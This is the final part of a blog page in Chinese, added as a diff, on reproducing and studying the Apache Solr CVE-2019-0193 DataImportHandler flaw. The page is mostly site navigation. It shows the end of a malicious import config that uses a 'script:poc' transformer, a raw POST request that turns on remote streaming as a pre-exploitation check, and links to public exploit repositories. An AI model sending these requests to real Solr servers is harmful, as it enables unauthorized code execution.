+        <span class="token attr-name">rootEntity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span>
+        <span class="token attr-name">forEach</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/RDF/item<span class="token punctuation">"</span></span>
+        <span class="token attr-name">transformer</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>script:poc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span> <span class="token attr-name">xpath</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/RDF/item/title<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>entity</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>document</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataConfig</span><span class="token punctuation">></span></span>
+</code></pre>
+<p><img src="/posts/1199978306/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679482413077.jpg" alt="-w1428"></p>
+<p>该方法虽然方便 但检测可能失败<br>缺点:对低版本无法检测 - 因为通过POST请求修改configoverlay.json文件中的配置会失败<br>可以先用以下数据包检测</p>
+<pre><code>POST /solr/tika/config HTTP/1.1
+Host: 127.0.0.1
+Accept: */*
+Content-type:application/json
+Content-Length: 159
+Connection: close
+
+{&quot;set-property&quot;: {&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;: true}, &quot;set-property&quot;: {&quot;requestDispatcher.requestParsers.enableStreamBody&quot;: true}}
+
+</code></pre><p>返回200 则可用该版本可行检测，500 则不行<br><img src="/posts/1199978306/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679484163317.jpg" alt="-w1263"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.ishenping.com/ArtInfo/1196947.html" target="_blank" rel="noopener">solr源码通过idea进行本地调试</a><br><a href="https://github.com/jas502n/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-0193</a><br><a href="https://github.com/Imanfeng/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/Imanfeng/CVE-2019-0193</a><br><a href="https://github.com/1135/solr_exploit#%E6%A3%80%E6%B5%8B%E6%BC%8F%E6%B4%9E---exploit1" target="_blank" rel="noopener">https://github.com/1135/solr_exploit#%E6%A3%80%E6%B5%8B%E6%BC%8F%E6%B4%9E—exploit1</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://blog.th3wind.xyz">th3wind</a>
+            <p>原文链接：<a href="https://blog.th3wind.xyz/posts/1199978306/">https://blog.th3wind.xyz/posts/1199978306/</a>
+            <p>发表日期：<a href="https://blog.th3wind.xyz/posts/1199978306/">September 8th 2019, 11:50:00 pm</a>
+            <p>更新日期：<a href="https://blog.th3wind.xyz/posts/1199978306/">September 9th 2019, 11:01:02 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/posts/4232223630/" title= "java sql注入">
+                    <div class="nextTitle">java sql注入</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/posts/441860727/" title= "fastjson 反序列化（二）">
+                    <div class="prevTitle">fastjson 反序列化（二）</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:1119225754@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/blackjliuyun" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-Solr-CVE-2019-0193-复现与学习"><span class="toc-number">1.</span> <span class="toc-text">Apache Solr CVE-2019-0193 复现与学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介（抄袭，具体功能没搞懂）"><span class="toc-number">1.1.</span> <span class="toc-text">简介（抄袭，具体功能没搞懂）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞-CVE-2019-0193"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞 CVE-2019-0193</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.2.2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#简版vulhub"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">简版vulhub</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#配置下载"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">配置下载</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#源码导入idea调试"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text">源码导入idea调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用方式"><span class="toc-number">1.2.3.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#数据源类型为URLDataSource"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">数据源类型为URLDataSource</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#远程检测poc"><span class="toc-number">1.2.3.1.1.</span> <span class="toc-text">远程检测poc</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据源类型为ContentStreamDataSource"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">数据源类型为ContentStreamDataSource</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">1.3.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 19
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span><a class="archive-post-title" href= "/posts/2306483136/" >jackson反序列化漏洞_1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span><a class="archive-post-title" href= "/posts/238052750/" >java反弹shell</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/13</span><a class="archive-post-title" href= "/posts/4232223630/" >java sql注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href= "/posts/1199978306/" >Apache Solr CVE-2019-0193 复现与学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span><a class="archive-post-title" href= "/posts/441860727/" >fastjson 反序列化（二）</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/posts/799045951/" >json与jsonp的学习与分析</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/21</span><a class="archive-post-title" href= "/posts/1832779944/" >DOM XSS从javascript中输出数据到HTML页面</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href= "/posts/1479992369/" >fastjson 1.2.47 rce</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span><a class="archive-post-title" href= "/posts/3083871992/" >计划任务</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/08</span><a class="archive-post-title" href= "/posts/384491153/" >XXE实例及应用3</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/posts/0/" >[Untitled Post]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/posts/577137578/" >ETH 漏洞复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/28</span><a class="archive-post-title" href= "/posts/608224058/" >XXE 示例及利用-java—SDK-1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/posts/3609640977/" >frida理解与学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/10</span><a class="archive-post-title" href= "/posts/1469573512/" >安全策略-csp理解与学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/posts/3327493404/" >2019</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/posts/4121068354/" >XXE 示例及利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href= "/posts/3586992485/" >编码绕过xss</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/posts/1899165956/" >BCH分叉-重放攻击解决方案</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="生活"><span class="iconfont-archer">&#xe606;</span>生活</span>
+    
+        <span class="sidebar-tag-name" data-tags="规划"><span class="iconfont-archer">&#xe606;</span>规划</span>
+    
+        <span class="sidebar-tag-name" data-tags="区块链安全"><span class="iconfont-archer">&#xe606;</span>区块链安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web安全"><span class="iconfont-archer">&#xe606;</span>Web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web渗透"><span class="iconfont-archer">&#xe606;</span>Web渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="常规渗透"><span class="iconfont-archer">&#xe606;</span>常规渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="浏览器安全策略"><span class="iconfont-archer">&#xe606;</span>浏览器安全策略</span>
+    
+        <span class="sidebar-tag-name" data-tags="内网渗透"><span class="iconfont-archer">&#xe606;</span>内网渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="计划任务"><span class="iconfont-archer">&#xe606;</span>计划任务</span>
+    
+        <span class="sidebar-tag-name" data-tags="移动端"><span class="iconfont-archer">&#xe606;</span>移动端</span>
+    
+        <span class="sidebar-tag-name" data-tags="frida"><span class="iconfont-archer">&#xe606;</span>frida</span>
+    
+        <span class="sidebar-tag-name" data-tags="XXE 实例利用"><span class="iconfont-archer">&#xe606;</span>XXE 实例利用</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞学习"><span class="iconfont-archer">&#xe606;</span>漏洞学习</span>
+    
+        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
+    
+        <span class="sidebar-tag-name" data-tags="web 渗透"><span class="iconfont-archer">&#xe606;</span>web 渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="java反序列化"><span class="iconfont-archer">&#xe606;</span>java反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="jackson"><span class="iconfont-archer">&#xe606;</span>jackson</span>
+    
+        <span class="sidebar-tag-name" data-tags="java sql注入"><span class="iconfont-archer">&#xe606;</span>java sql注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="java反弹shell"><span class="iconfont-archer">&#xe606;</span>java反弹shell</span>
+    
+        <span class="sidebar-tag-name" data-tags="fastjson"><span class="iconfont-archer">&#xe606;</span>fastjson</span>
+    
+        <span class="sidebar-tag-name" data-tags="Apache Solr CVE-2019-0193"><span class="iconfont-archer">&#xe606;</span>Apache Solr CVE-2019-0193</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="区块链安全"><span class="iconfont-archer">&#xe60a;</span>区块链安全</span>
+    
+        <span class="sidebar-category-name" data-categories="Web安全"><span class="iconfont-archer">&#xe60a;</span>Web安全</span>
+    
+        <span class="sidebar-category-name" data-categories="Web渗透"><span class="iconfont-archer">&#xe60a;</span>Web渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="浏览器安全策略"><span class="iconfont-archer">&#xe60a;</span>浏览器安全策略</span>
+    
+        <span class="sidebar-category-name" data-categories="Web安全/XSS"><span class="iconfont-archer">&#xe60a;</span>Web安全/XSS</span>
+    
+        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="Web渗透/常规渗透"><span class="iconfont-archer">&#xe60a;</span>Web渗透/常规渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="浏览器安全策略/csp"><span class="iconfont-archer">&#xe60a;</span>浏览器安全策略/csp</span>
+    
+        <span class="sidebar-category-name" data-categories="Web渗透/安全策略"><span class="iconfont-archer">&#xe60a;</span>Web渗透/安全策略</span>
+    
+        <span class="sidebar-category-name" data-categories="内网渗透/计划任务"><span class="iconfont-archer">&#xe60a;</span>内网渗透/计划任务</span>
+    
+        <span class="sidebar-category-name" data-categories="Web渗透/常规渗透/XSS"><span class="iconfont-archer">&#xe60a;</span>Web渗透/常规渗透/XSS</span>
+    
+        <span class="sidebar-category-name" data-categories="Web渗透/漏洞学习"><span class="iconfont-archer">&#xe60a;</span>Web渗透/漏洞学习</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透"><span class="iconfont-archer">&#xe60a;</span>web-渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/java反序列化"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/java反序列化/jackson"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化/jackson</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/java反序列化/java-sql注入"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化/java-sql注入</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/java反序列化/java反弹shell"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化/java反弹shell</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/漏洞学习"><span class="iconfont-archer">&#xe60a;</span>web-渗透/漏洞学习</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/漏洞学习/fastjson"><span class="iconfont-archer">&#xe60a;</span>web-渗透/漏洞学习/fastjson</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/漏洞学习/Apache-Solr-CVE-2019-0193"><span class="iconfont-archer">&#xe60a;</span>web-渗透/漏洞学习/Apache-Solr-CVE-2019-0193</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "th3wind"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
